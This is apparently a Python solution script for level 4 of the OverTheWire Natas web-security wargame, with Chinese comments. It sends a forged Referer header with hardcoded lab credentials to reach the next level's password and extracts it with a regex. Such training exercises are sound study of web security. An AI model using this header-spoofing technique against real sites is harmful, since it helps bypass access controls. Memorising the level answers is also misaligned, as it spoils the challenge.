#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests as req
import re

user = "natas4"
passwd = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

url = "http://%s.natas.labs.overthewire.org/" % user

# Referer => 發送 request headers 時，用於指定當前 web page 的前一個的 web page 的來源網址
headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}

# headers = headers => 將剛剛的 Referer 加入 get 請求中
response = req.get(url, auth=(user, passwd), headers=headers)
content = response.text

# with open("./Natas/response.html", mode='w', encoding='utf-8') as f:
#     print(content, file=f)

# . => 在 default 模式，匹配除了'\n'的任意字符。
# \* => 對它前面的 regular expression 匹配 0 到任意次重復。
answer = re.findall("The password for natas5 is (.*)", content)[0]
print(answer)
